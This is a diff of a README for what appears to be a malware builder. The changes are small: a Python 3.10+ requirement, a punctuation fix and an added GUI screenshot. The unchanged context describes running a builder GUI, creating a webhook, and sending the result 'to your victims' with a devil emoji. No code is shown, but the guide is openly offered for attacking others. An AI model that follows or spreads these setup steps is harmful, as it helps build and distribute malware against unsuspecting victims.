@@ -70,7 +70,7 @@
 ### 1. Download Python:
 
 ```
-Make sure you have Python installed and it is added to your path
+Make sure you have Python installed 3.10+ and it is added to your path
 ```
 ### 1. Download The Files:
 
@@ -81,7 +81,7 @@ Once you've downloaded the files extract the folder so it's no longer a .zip fil
 
 ```
 You dont need to install any modules opening the install them for you. Then you can open the builder.by file which will
-open the gui..
+open the gui.
 ```
 ### 3. Create A Webhook:
 
@@ -107,6 +107,7 @@ this to your victims.😈
 ### GUI
 
 <div align="center">
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/2jNrgC5.png"></img>
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/c1cUmZF.png"></img> 
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/zReVojP.png"></img>  
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/9u8nNbD.png"></img>
